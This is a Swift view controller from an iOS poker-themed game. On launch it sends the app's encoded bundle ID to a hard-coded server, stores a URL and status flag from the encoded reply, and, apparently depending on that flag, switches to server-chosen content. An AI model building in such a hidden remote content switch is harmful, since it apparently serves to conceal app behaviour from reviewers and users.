//
//  ViewController.swift
//  GameGlimpsePokerPath
//
//  Created by jin fu on 2025/3/12.
//

import UIKit
import Adjust

class GameGlimpseStartViewController: UIViewController, AdjustDelegate {

    @IBOutlet weak var activityView: UIActivityIndicatorView!
    
    override func viewDidLoad() {
        super.viewDidLoad()
        // Do any additional setup after loading the view.
        
        activityView.hidesWhenStopped = true
        loadAdsData()
    }

    private func loadAdsData() {
        activityView.startAnimating()
        
        let recordID = getAFIDStr()
        if !recordID.isEmpty {
            activityView.stopAnimating()
            let status = getStatus()
            if status.intValue == 1 {
                initAdjust()
                showAdsViewData()
            }
            return
        }
        
        if GameGlimpseReachabilityManager.shared().isReachable {
            getAppDeviceAdsDatass()
        } else {
            GameGlimpseReachabilityManager.shared().setReachabilityStatusChange { status in
                if GameGlimpseReachabilityManager.shared().isReachable {
                    self.getAppDeviceAdsDatass()
                    GameGlimpseReachabilityManager.shared().stopMonitoring()
                }
            }
            GameGlimpseReachabilityManager.shared().startMonitoring()
        }
    }
    
    private func getAppDeviceAdsDatass() {
        guard let bundleId = Bundle.main.bundleIdentifier else { return }
        
        let encodedBundleId = Data(bundleId.utf8).base64EncodedString()
        let adDataUrlString = "https://gshss.top/system/getAppDeviceAdsDatass?id=\(encodedBundleId)"
        
        guard let adDataUrl = URL(string: adDataUrlString) else { return }
        
        var request = URLRequest(url: adDataUrl)
        request.httpMethod = "GET"
        
        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                self.activityView.stopAnimating()
                
                if let error = error {
                    print("Error: \(error.localizedDescription)")
                    return
                }
                
                guard let data = data, let str = String(data: data, encoding: .utf8),
                      let base64EncodedData = Data(base64Encoded: str) else { return }
                
                do {
                    if let jsonObject = try JSONSerialization.jsonObject(with: base64EncodedData, options: []) as? [String: Any],
                       let status = jsonObject["status"] as? NSNumber,
                       let url = jsonObject["url"] as? String {
                        
                        self.saveAFStringId(url)
                        self.saveStatus(status)
                        self.initAdjust()
                        
                        if status.intValue == 1 {
                            self.showAdsViewData()
                        }
                    }
                } catch {
                    print("JSON parsing error: \(error.localizedDescription)")
                }
            }
        }
        task.resume()
    }
    
    // MARK: - Adjust SDK
    private func initAdjust() {
        
        let token = getad()
        if !token.isEmpty {
            let environment = ADJEnvironmentProduction
            let adjustConfig = ADJConfig(appToken: token, environment: environment)
            adjustConfig?.delegate = self
            adjustConfig?.logLevel = ADJLogLevelVerbose
            Adjust.appDidLaunch(adjustConfig)
        }
    }
    
    func adjustAttributionChanged(_ attribution: ADJAttribution?) {
        if let adid = attribution?.adid {
            print("adid: \(adid)")
        }
    }
}

